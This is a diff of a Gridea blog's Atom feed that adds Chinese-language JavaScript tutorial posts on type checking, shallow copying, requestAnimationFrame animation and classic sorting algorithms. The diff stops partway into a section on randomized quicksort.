@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://hubingliang.github.io</id>
     <title>Gridea</title>
-    <updated>2019-06-03T09:19:17.300Z</updated>
+    <updated>2019-06-03T09:54:03.064Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://hubingliang.github.io"/>
     <link rel="self" href="https://hubingliang.github.io/atom.xml"/>
@@ -254,6 +254,123 @@ json({
 ]]></content>
     </entry>
     <entry>
+        <title type="html"><![CDATA[可能是最全的 Javascript 类型检查方案]]></title>
+        <id>https://hubingliang.github.io/post/type</id>
+        <link href="https://hubingliang.github.io/post/type">
+        </link>
+        <updated>2019-01-02T10:58:11.000Z</updated>
+        <content type="html"><![CDATA[<blockquote>
+<p>本文首发于我的个人博客 ：<a href="http://brownhu.site/">brownhu.site</a></p>
+</blockquote>
+<h2 id="前言">前言</h2>
+<p>类型检查在各种强类型语言（Typescript、Flow.js）出现之前一直是我们手动检查的，检查的方式也是多种多样。本文尽量总结出所有类型最优的检查方式，和解释所有方式的原理，如果有错误请各位大佬指正，除此之外对于类型检查当然拥抱强类型我觉得才是未来。</p>
+<p>es6 之后新加入了 Symbol 类型，目前为止 JavaScript 一共有 7 种类型，但其中还有分类（set WeakSet Map WeakMap），我们就基于这些类型来探索：</p>
+<ul>
+<li>null</li>
+<li>undefined</li>
+<li>boolean</li>
+<li>number</li>
+<li>string</li>
+<li>object (set WeakSet Map WeakMap)</li>
+<li>symbol(ES6 中新增)</li>
+</ul>
+<h2 id="typeof">Typeof</h2>
+<p>首先是 Typeof，Typeof 可能是最多人所熟知的判断类型的方法，但是它并不完美，在有些情况下它的判断是有偏差的，我们来看看几个例子：</p>
+<pre><code class="language-js">// 首先判断基本类型
+typeof 1 // number
+typeof 'Hellow world !' // string
+typeof true // boolean
+typeof null // object
+typeof undefined // undefined
+
+let s = Symbol()
+typeof s // symbol
+</code></pre>
+<p>可以看到 null 的判断出了错误，这个大家看面试题也或多或少知道这个坑。
+然后我们再来看看引用类型：</p>
+<pre><code class="language-js">const obj = Object.create(null) // 之所以这样创建是因为编程习惯...
+function foo() {}
+const arr = []
+const s = new Set()
+const ws = new WeakSet()
+const m = new Map()
+const wm = new WeakMap()
+
+typeof obj // object
+typeof foo // function
+typeof arr // object
+typeof s // object
+typeof ws // object
+typeof m // object
+typeof wm // object
+</code></pre>
+<p>我们发现 typeof 在判断引用类型的时候并不能区分除了 function 以外其他类型的区别。至于为什么会出现这样的情况，就要看看 typeof 的原理。</p>
+<h3 id="typeof-原理">typeof 原理</h3>
+<p>在说原理之前需要先知道，js 是怎么储存数据类型的？</p>
+<p>JavaScript 在底层储存变量时出于性能考虑会把数据的类型用前三位表示，typeof 就是通过前三位来判断类型：</p>
+<ul>
+<li>000: 对象</li>
+<li>001: 整数</li>
+<li>010: 浮点数</li>
+<li>100: 字符串</li>
+<li>110: 布尔</li>
+</ul>
+<p>两个特殊类型：</p>
+<ul>
+<li>undefined: -2^30</li>
+<li>null: 全是 0</li>
+</ul>
+<p>因为 null 的机器码是全 0，它的类型标签自然就是 000，所以 typeof null 返回&quot;object&quot;。</p>
+<h2 id="instanceof">instanceof</h2>
+<p>instanceof 是有局限性的，它要求判断的目标必须是一个对象，与此同时 instanceof 的原理是判断只要右边的 prototype 出现在左边的原型链上就返回 true。所以说 instanceof 是判断一个实例是否是其父类型或者祖先类型的实例更为恰当。</p>
+<p>代码的基本实现：</p>
+<pre><code class="language-js">function instance_of(L, R) {    // L 表示左表达式，R 表示右表达式
+ var O = R.prototype;           // 取 R 的显示原型
+ L = L.__proto__;               // 取 L 的隐式原型
+ while (true) { 
+   if (L === null) 
+     return false; 
+   if (O === L)                 // 当 O 严格等于 L 时，返回 true 
+     return true; 
+   L = L.__proto__; 
+ } 
+}
+</code></pre>
+<p>还是看例子比较直接：</p>
+<pre><code class="language-js">const obj1 = Object.create(null)
+const obj2 = {}
+
+obj1 instanceof Object // false
+obj2 instanceof Object // true
+</code></pre>
+<p>通过这个例子你能很明确的想明白 instanceof 的原理，因为 obj1 是通过<code>Object.create(null)</code>来创建的，它原型链上什么都没有：</p>
+<p><img src="https://i.loli.net/2019/01/02/5c2c8b9a13878.png" alt=""></p>
+<p>而直接通过<code>{}</code>赋值生成的对象它的<code>_proto_</code>是指向 Object 的：</p>
+<p><img src="https://i.loli.net/2019/01/02/5c2c8bc36b1f2.png" alt=""></p>
+<p>所以判断结果就会有不同，</p>
+<h2 id="objectprototypetostringcall">Object.prototype.toString.call()</h2>
+<p>这个方法可以说是目前比较全面的类型判断方法了，还是看看例子：</p>
+<pre><code class="language-js">Object.prototype.toString.call(null) // &quot;[object Null]&quot;
+Object.prototype.toString.call(undefined) // &quot;[object Undefined]&quot;
+Object.prototype.toString.call(123) // &quot;[object Number]&quot;
+Object.prototype.toString.call(true) // &quot;[object Boolean]&quot;
+Object.prototype.toString.call('Hellow world !') // &quot;[object String]&quot;
+Object.prototype.toString.call({ a: 123 }) // &quot;[object Object]&quot;
+Object.prototype.toString.call(Symbol()) // &quot;[object Symbol]&quot;
+Object.prototype.toString.call([1, 2, 3]) // &quot;[object Array]&quot;
+Object.prototype.toString.call(function a() {}) // &quot;[object Function]&quot;
+Object.prototype.toString.call(new Date()) // &quot;[object Date]&quot;
+Object.prototype.toString.call(Math) // &quot;[object Math]&quot;
+Object.prototype.toString.call(new Set()) // &quot;[object Set]&quot;
+Object.prototype.toString.call(new WeakSet()) // &quot;[object WeakSet]&quot;
+Object.prototype.toString.call(new Map()) // &quot;[object Map]&quot;
+Object.prototype.toString.call(new WeakMap()) // &quot;[object WeakMap]&quot;,/'.lk
+</code></pre>
+<p>可以说<code>Object.prototype.toString.call()</code>在大部分类型的考验下都不落下风，可以说是比较完美的类型检查了。
+至于原理大家可以移步至<a href="https://segmentfault.com/a/1190000009407558">谈谈 Object.prototype.toString</a></p>
+]]></content>
+    </entry>
+    <entry>
         <title type="html"><![CDATA[Hello Gridea]]></title>
         <id>https://hubingliang.github.io/post/hello-gridea</id>
         <link href="https://hubingliang.github.io/post/hello-gridea">
@@ -283,6 +400,532 @@ json({
 <p>未来，它一定会成为你离不开的伙伴</p>
 <p>尽情发挥你的才华吧！</p>
 <p>😘 Enjoy~</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[浅拷贝没那么简单]]></title>
+        <id>https://hubingliang.github.io/post/shallow-copy</id>
+        <link href="https://hubingliang.github.io/post/shallow-copy">
+        </link>
+        <updated>2018-07-20T09:45:16.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="拷贝的分类">拷贝的分类</h2>
+<ol>
+<li>浅拷贝： 只能对基本类型的值拷贝，如果所要拷贝的对象的某个属性的值是对象的话，那么目标对象拷贝得到的是这个对象的引用。</li>
+<li>深拷贝： 和原对象一样的属性和原型，相互之间互不影响（不一样的内存地址）</li>
+</ol>
+<p>在写这篇博客之前，看了很多博客实现的浅拷贝，发现大家实现的方法或多或少都有些不足，今天就把这些坑说一说。</p>
+<ul>
+<li>我需不需要拷贝原对象的原型？</li>
+<li>对象中有以Symbol为属性名的属性我需不需要拷贝？</li>
+<li>对象中有不可遍历的属性，我要不要拷贝？</li>
+</ul>
+<h2 id="逐个属性遍历es6之前">逐个属性遍历（ES6之前）</h2>
+<p>通过逐个遍历对象的属性并复制，来实现浅拷贝，但这种方法有两个弊端：</p>
+<ul>
+<li>不可遍历以symbol为属性名的属性</li>
+<li>不可遍历不可枚举属性</li>
+</ul>
+<blockquote>
+<p>Symbol 作为属性名，该属性不会出现在for...in、for...of循环中，也不会被Object.keys()、Object.getOwnPropertyNames()、JSON.stringify()返回。</p>
+</blockquote>
+<pre><code class="language-js">// 浅拷贝函数
+function shallowClone(obj) {
+    const newObj = {};
+    for (let i in obj) {
+        newObj[i] = obj[i];
+    }
+    return newObj;
+}
+// 被拷贝对象
+const obj1 = {
+    a: 1,
+    b: 'hellow world',
+    c: true,
+    d: Symbol('symbol'),
+    [Symbol('e')]: 'e',
+}
+Object.defineProperty(obj1, 'f', {
+  value: 'f',
+  enumerable: false,
+}) // 添加不可枚举属性
+const obj2 = shallowClone(obj1);
+
+obj2 // {a: 1, b: &quot;hellow world&quot;, c: true, d: Symbol(symbol)}
+</code></pre>
+<p>所拷贝的对象并没有以symbol为属性名的属性，也不能拷贝不可遍历的属性，所以这种方法并不是最佳实践。</p>
+<h2 id="es6下的浅拷贝">ES6下的浅拷贝</h2>
+<p>ES6新增了许多操作对象或者遍历对象的API，下面分别测试下能不能实现完美的浅拷贝</p>
+<h3 id="objectassign"><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/assign">Object.assign()</a></h3>
+<p>通过和空对象合并来实现浅拷贝：</p>
+<pre><code class="language-js">const obj1 = {
+    a: 1,
+    b: 'hellow world',
+    c: true,
+    d: Symbol('symbol'),
+    [Symbol('e')]: 'e',
+}
+const obj2 = Object.assign({},obj1) // ES6新扩展： Object.assign() 
+obj2 // {a: 1, b: &quot;hellow world&quot;, c: true, d: Symbol(symbol), Symbol(e): &quot;e&quot;}
+</code></pre>
+<p>发现可以实现对以symbol为属性名的属性的拷贝，但是对于不可枚举属性<code>Object.assign()</code>还是无能为力。 我们在MDN上发现<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/assign">Object.assign()</a>不可以遍历出不可枚举属性：</p>
+<blockquote>
+<p>Object.assign() 方法用于将所有可枚举属性的值从一个或多个源对象复制到目标对象。它将返回目标对象。</p>
+</blockquote>
+<h3 id="解构赋值rest">解构赋值+rest</h3>
+<p>那我们看看更加优雅的解构赋值+rest能不能实现完美的浅克隆通过ES6的解构赋值可以更简单的实现浅拷贝：</p>
+<pre><code class="language-js">const obj1 = {
+    a: 1,
+    b: 'hellow world',
+    c: true,
+    d: Symbol('symbol'),
+    [Symbol('e')]: 'e',
+}
+Object.defineProperty(obj1, 'f', {
+  value: 'f',
+  enumerable: false,
+});
+let { ...obj2 } = obj1
+obj2 // {a: 1, b: &quot;hellow world&quot;, c: true, d: Symbol(symbol), Symbol(e): &quot;e&quot;}
+</code></pre>
+<p>发现依然不能解决不可遍历属性的问题。</p>
+<h2 id="es7下的浅拷贝">ES7下的浅拷贝</h2>
+<h3 id="objectgetownpropertydescriptors"><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/getOwnPropertyDescriptor">Object.getOwnPropertyDescriptors</a></h3>
+<blockquote>
+<p><code>Object.getOwnPropertyDescriptor()</code> 方法返回指定对象上一个自有属性对应的属性描述符。（自有属性指的是直接赋予该对象的属性，不需要从原型链上进行查找的属性）</p>
+</blockquote>
+<p><code>Object.getOwnPropertyDescriptors</code>方法可以配合<code>Object.create</code>方法实现浅拷贝:</p>
+<pre><code class="language-js">const shallowClone = (obj) =&gt; Object.create(
+    Object.getPrototypeOf(obj),
+    Object.getOwnPropertyDescriptors(obj)
+);
+const obj1 = {
+    a: 1,
+    b: 'hellow world',
+    c: true,
+    d: Symbol('symbol'),
+    [Symbol('e')]: 'e',
+}
+Object.defineProperty(obj1, 'f', {
+    value: 'f',
+    enumerable: false,
+});
+const obj2 = shallowClone(obj1);
+
+obj2 //{a: 1, b: &quot;hellow world&quot;, c: true, d: Symbol(symbol), f: &quot;f&quot;}
+</code></pre>
+<p>基本上完美实现了对所有类型属性的拷贝，可以看见即使是浅拷贝，要踩得坑还是很多的。</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[使用requestAnimationFrame来提升动画性能]]></title>
+        <id>https://hubingliang.github.io/post/requestanimationframe</id>
+        <link href="https://hubingliang.github.io/post/requestanimationframe">
+        </link>
+        <updated>2018-05-20T09:42:21.000Z</updated>
+        <content type="html"><![CDATA[<p><img src="https://user-gold-cdn.xitu.io/2018/5/20/1637ddf84e9110d6?w=550&amp;h=365&amp;f=jpeg&amp;s=59063" alt=""></p>
+<h2 id="传统动画的弊端">传统动画的弊端</h2>
+<p>在实际项目中我们经常会遇到生成动画的需求，传统方法是通过使用setTimeout和setInterval进行实现，但是定时器动画有两个弊端：</p>
+<ul>
+<li>时间间隔并不好拿捏，设置太短浏览器重绘频率太快会产生性能问题，太慢的话又显得像PPT不够平滑，业界推荐的时间间隔是16.66...（显示器刷新频率是60Hz，1000ms/60）</li>
+<li>浏览器UI线程堵塞问题，如果UI线程之中有很多待完成的渲染任务，所要执行的动画就会被搁置。</li>
+</ul>
+<p>为了解决这些问题HTML5加入了requestAnimationFrame</p>
+<h2 id="requestanimationframe">requestAnimationFrame？</h2>
+<p><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Window/requestAnimationFrame">MDN</a></p>
+<blockquote>
+<p>window.requestAnimationFrame() 方法告诉浏览器您希望执行动画并请求浏览器在下一次重绘之前调用指定的函数来更新动画。该方法使用一个回调函数作为参数，这个回调函数会在浏览器重绘之前调用。</p>
+</blockquote>
+<ul>
+<li>
+<p>requestAnimationFrame会把每一帧中的所有DOM操作集中起来，在一次重绘或回流中就完成，并且重绘或回流的时间间隔紧紧跟随浏览器的刷新频率</p>
+</li>
+<li>
+<p>在隐藏或不可见的元素中，requestAnimationFrame将不会进行重绘或回流，这当然就意味着更少的CPU、GPU和内存使用量</p>
+</li>
+<li>
+<p>requestAnimationFrame是由浏览器专门为动画提供的API，在运行时浏览器会自动优化方法的调用，并且如果页面不是激活状态下的话，动画会自动暂停，有效节省了CPU开销</p>
+</li>
+</ul>
+<h2 id="用法">用法</h2>
+<p>你可以直接调用<code>requestAnimationFrame()</code>，也可以通过window来调用<code>window.requestAnimationFrame()</code>。
+requestAnimationFrame()接收一个函数作为回调，返回一个ID值，通过把这个ID值传给<code>window.cancelAnimationFrame()</code>可以取消该次动画。</p>
+<p>MDN上给的例子：</p>
+<pre><code class="language-js">var start = null;
+var element = document.getElementById('SomeElementYouWantToAnimate');
+element.style.position = 'absolute';
+
+function step(timestamp) {
+  if (!start) start = timestamp;
+  var progress = timestamp - start;
+  element.style.left = Math.min(progress / 10, 200) + 'px';
+  if (progress &lt; 2000) {
+    window.requestAnimationFrame(step);
+  }
+}
+</code></pre>
+<h2 id="例子">例子</h2>
+<p>我们来试试生成一个旋转并逐渐变窄的方块，当窄到一定程度又会复原循环往复。
+<a href="http://jsbin.com/xeferik/3/edit?js,output">jsbin看看效果</a></p>
+<pre><code class="language-js">var rotate = 0;
+var width = 400;
+var element = document.getElementById('box');
+
+function step(timestamp) {
+    rotate += 10
+    element.style.transform = `rotate(${rotate}deg)`;
+    window.requestAnimationFrame(step);
+}
+
+function small(timestamp) {
+    width = width - 1
+    element.style.width = width + 'px';
+    if (width &lt;= 50) {
+        window.requestAnimationFrame(big);
+    } else {
+        window.requestAnimationFrame(small);
+    }
+}
+function big() {
+    width = width + 1
+    element.style.width = width + 'px';
+    if (width &gt;= 400) {
+        window.requestAnimationFrame(small);
+    } else {
+        window.requestAnimationFrame(big);
+    }
+}
+
+window.requestAnimationFrame(step);
+window.requestAnimationFrame(small);
+</code></pre>
+<h2 id="浏览器兼容情况">浏览器兼容情况</h2>
+<p>我们来看一下[Can I Use](https://caniuse.com/## search=requestAnimationFrame)上的兼容情况：
+<img src="https://user-gold-cdn.xitu.io/2018/5/20/1637d6be4df448ce?w=1718&amp;h=781&amp;f=png&amp;s=80112" alt="">
+requestAnimationFrame的兼容情况还是不错的（看不见IE）</p>
+<p>如果非要兼容IE的话可以用定时器来做一下兼容：</p>
+<pre><code class="language-js">(function () {
+    var lastTime = 0;
+    var vendors = ['webkit', 'moz'];
+    for (var x = 0; x &lt; vendors.length &amp;&amp; !window.requestAnimationFrame; ++x) {
+        window.requestAnimationFrame = window[vendors[x] + 'RequestAnimationFrame'];
+        window.cancelAnimationFrame =
+            window[vendors[x] + 'CancelAnimationFrame'] || window[vendors[x] + 'CancelRequestAnimationFrame'];
+    }
+
+    if (!window.requestAnimationFrame)
+        window.requestAnimationFrame = function (callback) {
+            /*调整时间，让一次动画等待和执行时间在最佳循环时间间隔内完成*/
+            var currTime = new Date().getTime();
+            var timeToCall = Math.max(0, 16 - (currTime - lastTime));
+            var id = window.setTimeout(function () {
+                callback(currTime + timeToCall);
+            },
+                timeToCall);
+            lastTime = currTime + timeToCall;
+            return id;
+        };
+
+    if (!window.cancelAnimationFrame)
+        window.cancelAnimationFrame = function (id) {
+            clearTimeout(id);
+        };
+}());
+</code></pre>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[排序算法-N个正整数排序]]></title>
+        <id>https://hubingliang.github.io/post/sort</id>
+        <link href="https://hubingliang.github.io/post/sort">
+        </link>
+        <updated>2018-05-09T09:46:49.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="算法">算法</h2>
+<p>高德纳在《计算机程序设计艺术》里对算法归纳为以下几点：</p>
+<blockquote>
+<ol>
+<li>输入: 一个算法必须有零或以上的输入量</li>
+<li>输出: 一个算法应有一个或以上的输出量</li>
+<li>明确性: 算法的描述必须无歧义,实际运行结果是确定的</li>
+<li>有限性: 必须在有限个步骤内结束</li>
+<li>有效性: 又称可行性,能够被执行者实现</li>
+</ol>
+</blockquote>
+<p><strong>如果想详细研究算法推荐《数据结构与算法分析》</strong></p>
+<p><img src="http://upload-images.jianshu.io/upload_images/4337988-706bb05d7f8e293f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="数据结构与算法分析"></p>
+<h2 id="定义问题">定义问题</h2>
+<p>数组array含有N个正整数
+输入量为array
+请将array中的数字从小到大排列
+输出量为排好序的数组</p>
+<p>代码例子</p>
+<pre><code class="language-js">var array = [5,2,4,6,8]
+function sort(){
+   你的代码
+}
+sort(array) === [2,4,5,6,8]
+</code></pre>
+<p>当你遇到思路障碍怎么办?</p>
+<ul>
+<li>将<strong>抽象的问题</strong>转化为<strong>具体的问题</strong></li>
+<li>将<strong>没见过的问题</strong>转化为<strong>见过的问题</strong></li>
+</ul>
+<h2 id="排序算法">排序算法</h2>
+<p><strong><a href="https://visualgo.net/sorting">所有算法都可在此查看演示</a></strong></p>
+<h3 id="冒泡排序bubble">冒泡排序(BUBBLE)</h3>
+<p>重复地比较要排序的数列，一次比较两个元素，如果他们的顺序错误就把他们交换过来。比较数列的工作是重复地进行直到没有再需要交换，也就是说该数列已经排序完成。每比较一整轮,最大的都会出现在最后故名---<strong>冒泡排序</strong></p>
+<p>流程如下:</p>
+<ol>
+<li>我们拿到一个数组
+<img src="http://upload-images.jianshu.io/upload_images/4337988-51788201338ecebb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="数组"></li>
+<li>开始从前两个开始比较,发现44&gt;3,所以不用交换
+<img src="http://upload-images.jianshu.io/upload_images/4337988-27cf4ee44274aebd.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="比较"></li>
+<li>接着往后比较,发现38&lt;44,所以交换他们两个的位置
+<img src="http://upload-images.jianshu.io/upload_images/4337988-b106c8ea4d1e64a4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="比较"></li>
+<li>以此类推直到第一轮结束,我们得到了最大的那一个----<strong>50</strong>(冒的第一个泡)
+<img src="http://upload-images.jianshu.io/upload_images/4337988-05228b4f061ec01b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="第一轮结束"></li>
+<li>接着下一轮,又从头开始两个两个地比较,重复第一轮,我们就得到了第二个最大的------<strong>48</strong>
+<img src="http://upload-images.jianshu.io/upload_images/4337988-b3a220becd934a11.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="第二轮结束"></li>
+<li>如此进行多轮比较我们会得到一个从小到大的数组
+<img src="http://upload-images.jianshu.io/upload_images/4337988-f60c295026eac0f3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="从小到大"></li>
+<li>代码实现：</li>
+</ol>
+<pre><code class="language-js">function bubbleSort(array) {
+    for (let i = 0; i &lt; array.length - 1; i++) {
+        for (let j = 0; j &lt; array.length - i - 1; j++) {
+            if (array[j] &gt; array[j + 1]) {
+                let temp = array[j];
+                array[j] = array[j + 1];
+                array[j + 1] = temp;
+            }
+        }
+    }
+}
+</code></pre>
+<h3 id="2-选择排序select">2. 选择排序(SELECT)</h3>
+<p>每一次从待排序的数据元素中选出最小（或最大）的一个元素，存放在序列的起始位置，直到全部待排序的数据元素排完。
+流程如下:</p>
+<ol>
+<li>拿到一个数组
+<img src="http://upload-images.jianshu.io/upload_images/4337988-62f83dc193f1978c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="数组"></li>
+<li>我们要选出这个数组中最小的元素然后把它和第一个数交换(放到最前面),所以我们先认为3为最小,然后和后面的数依次进行比较.
+<img src="http://upload-images.jianshu.io/upload_images/4337988-b44dc333bdadd03b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="和最小值比较"></li>
+<li>当比到2的时候,我们发现3&gt;2,所以我们就认为2为最小值,后面的数应该都和2进行比较.
+<img src="http://upload-images.jianshu.io/upload_images/4337988-47bda740993e028c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="改变最小值的元素"></li>
+<li>当比较完所有的元素,确定2为最小值的时候,把最小值也就是2与第一个元素的位置互换.
+<img src="http://upload-images.jianshu.io/upload_images/4337988-549ba8d1e5375edd.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="互换位置"></li>
+<li>然后从第二个元素开始新一轮的比较,过程和第一轮一样.把44看做最小值和后面的元素进行比较.
+<img src="http://upload-images.jianshu.io/upload_images/4337988-93ae5c6008503d42.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="第二轮"></li>
+<li>经过多轮比较得到从小到大的数组.
+<img src="http://upload-images.jianshu.io/upload_images/4337988-10b714a8ceceb65f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="从小到大"></li>
+<li>代码实现</li>
+</ol>
+<pre><code class="language-js">function selectSort(arr) {
+    var minIndex, temp;
+    for (let i = 0; i &lt; arr.length - 1; i++) {
+        minIndex = i; // 先把第一个看做最小值
+        for (let j = i + 1; j &lt; arr.length; j++) {
+            if (arr[j] &lt; arr[minIndex]) {
+                minIndex = j;
+            }
+        }
+        temp = arr[i];
+        arr[i] = arr[minIndex];
+        arr[minIndex] = temp;
+    }
+    return arr;
+}
+</code></pre>
+<h3 id="3-插入排序insert">3, 插入排序(INSERT)</h3>
+<p>将一个数据插入到已经排好序的有序数据中，从而得到一个新的、个数加一的有序数据，算法适用于少量数据的排序。是稳定的排序方法。
+流程如下:</p>
+<ol>
+<li>拿到一个数组
+<img src="http://upload-images.jianshu.io/upload_images/4337988-0fe1ff7bc8912789.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="数组"></li>
+<li>把第一个元素看做一个新数组,然后把第二个元素依次和新数组的元素进行比较(虽然只有一个...),然后插入到适当的位置.
+<img src="http://upload-images.jianshu.io/upload_images/4337988-0b049542a383e8dc.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="与新数组的元素进行比较">
+<img src="http://upload-images.jianshu.io/upload_images/4337988-b08f38982e74bf87.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="插入到适当的位置"></li>
+<li>然后以此类推,把前两个元素看做是一个新数组,然后把第三个元素依次与新数组进行比较,然后插入到适当的位置.
+<img src="http://upload-images.jianshu.io/upload_images/4337988-25293f6061257350.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="比较">
+<img src="http://upload-images.jianshu.io/upload_images/4337988-435373ab53226a01.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="插入适当的位置"></li>
+<li>把剩下的元素依次插入,最后得到从小到大排列的数组.
+<img src="http://upload-images.jianshu.io/upload_images/4337988-eb5c7cdc2dbe51e3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="从小到大"></li>
+<li>代码实现</li>
+</ol>
+<pre><code class="language-js">function insertionSort(array) {
+    for (let i = 1; i &lt; array.length; i++) {
+        let key = array[i];
+        let j = i - 1;
+        while (j &gt;= 0 &amp;&amp; array[j] &gt; key) {
+            array[j + 1] = array[j];
+            j--;
+        }
+        array[j + 1] = key;
+    }
+    return array;
+}
+</code></pre>
+<h3 id="4-归并排序merge">4. 归并排序(MERGE)</h3>
+<p>将已有序的子序列合并，得到完全有序的序列；即先使每个子序列有序，再使子序列段间有序。
+流程如下:</p>
+<ol>
+<li>拿到一个数组
+<img src="http://upload-images.jianshu.io/upload_images/4337988-b7dd0bc29bf1f856.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="数组"></li>
+<li>我们把数组平均分成左右两部分,得到两个新数组,然后再把每个数组平均分成两部分,一直分到每个数组只有两个元素,然后比较第一组
+<img src="http://upload-images.jianshu.io/upload_images/4337988-f1f922e5fdac37ec.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="比较第一组"></li>
+<li>因为3&lt;44所以位置不变然后比较第二组,因为38&gt;5所以调换位置.
+<img src="http://upload-images.jianshu.io/upload_images/4337988-82e45b17bd304d2f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></li>
+<li>重点来了,这个时候先不着急比较第三组而是把排好序的一二两组放在一起排序.
+<img src="http://upload-images.jianshu.io/upload_images/4337988-a45b23e96799adbd.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></li>
+<li>之后就是比较第三组和第四组,然后同样把他们放在一起排好序.
+<img src="http://upload-images.jianshu.io/upload_images/4337988-ada3c8eb5b769b9e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></li>
+<li>然后并不是比较第五组和第六组,而是把第一组和第二组产生的新数组和,第三组和第四组产生的新数组放在一起排序成为新数组.
+<img src="http://upload-images.jianshu.io/upload_images/4337988-7df965288165ac01.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></li>
+<li>同样把剩下的按以上步骤重来一遍.我们得到两个排好序的数组.然后给这两个数组排序就完成了.
+<img src="http://upload-images.jianshu.io/upload_images/4337988-3e92a52343a0d8c5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png">
+排序后:
+<img src="http://upload-images.jianshu.io/upload_images/4337988-78eebc9c38d1ba31.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></li>
+<li>代码实现</li>
+</ol>
+<pre><code class="language-js">function mergeSort(arr) {
+    var len = arr.length;
+    if (len &lt; 2) {
+        return arr;
+    }
+    var middle = Math.floor(len / 2),
+        left = arr.slice(0, middle),
+        right = arr.slice(middle);
+    return merge(mergeSort(left), mergeSort(right));
+}
+
+function merge(left, right) {
+    var result = [];
+
+    while (left.length &amp;&amp; right.length) {
+        if (left[0] &lt;= right[0]) {
+            result.push(left.shift());
+        } else {
+            result.push(right.shift());
+        }
+    }
+
+    while (left.length)
+        result.push(left.shift());
+    while (right.length)
+        result.push(right.shift());
+
+    return result;
+}
+</code></pre>
+<h3 id="5-快速排序">5. 快速排序</h3>
+<p>每个元素找到自己对应的位置(前面的都比我小,后面的都比我大)
+流程如下:</p>
+<ol>
+<li>拿到一个数组
+<img src="http://upload-images.jianshu.io/upload_images/4337988-b7dd0bc29bf1f856.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="数组"></li>
+<li>拿第一个元素和后面的元素进行比较,找出所有比第一个元素小的元素,放在第一个元素的右边然后把第一个元素与这些比他小的元素的最后一个互换.
+<img src="http://upload-images.jianshu.io/upload_images/4337988-ce0718ea693d000a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="只有2比3小">
+<img src="http://upload-images.jianshu.io/upload_images/4337988-e7742e9a14f46e1a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="互换"></li>
+<li>前两个元素的位置已经没错了,然后以第三个元素为标准,和后面的元素进行比较.
+<img src="http://upload-images.jianshu.io/upload_images/4337988-e51bf6b6f28eccf0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="比较之后"></li>
+<li>把比他小的元素放在他的右边(绿色),然后让它和绿色的最后一个交换位置.
+<img src="http://upload-images.jianshu.io/upload_images/4337988-9635a1d9604436b6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="交换位置"></li>
+<li>然后从左边没有确定位置的元素(非橙色)开始以上步骤----也就是19
+<img src="http://upload-images.jianshu.io/upload_images/4337988-b3888a1ab15ac163.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="从19开始"></li>
+<li>一直到所有元素的位置都正确.
+<img src="http://upload-images.jianshu.io/upload_images/4337988-782962d8fbda2a3b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="都有了正确的位置"></li>
+<li>代码实现</li>
+</ol>
+<pre><code class="language-js">function quickSort(array) {
+    function quick(array, left, right) {
+        let index;
+        if (array.length &gt; 1) {
+            index = partition(array, left, right);
+            if (left &lt; index - 1) {
+                quick(array, left, index - 1);
+            }
+            if (index &lt; right) {
+                quick(array, index, right);
+            }
+        }
+        return array;
+    }
+    function partition(array, left, right) {
+        const pivot = array[Math.floor((right + left) / 2)];
+        let i = left;
+        let j = right;
+    
+        while (i &lt;= j) {
+            while (array[i] &lt; pivot) {
+                i++;
+            }
+            while (array[j] &gt; pivot) {
+                j--;
+            }
+            if (i &lt;= j) {
+                [array[i], array[j]] = [array[j], array[i]]
+                i++;
+                j--;
+            }
+        }
+        return i;
+    }
+    quick(array, 0, array.length - 1);
+};
+</code></pre>
+<h3 id="6-随机快速排序">6. 随机快速排序</h3>
+<p>顾名思义,就是在快速排序的基础上,加入随机的机制.
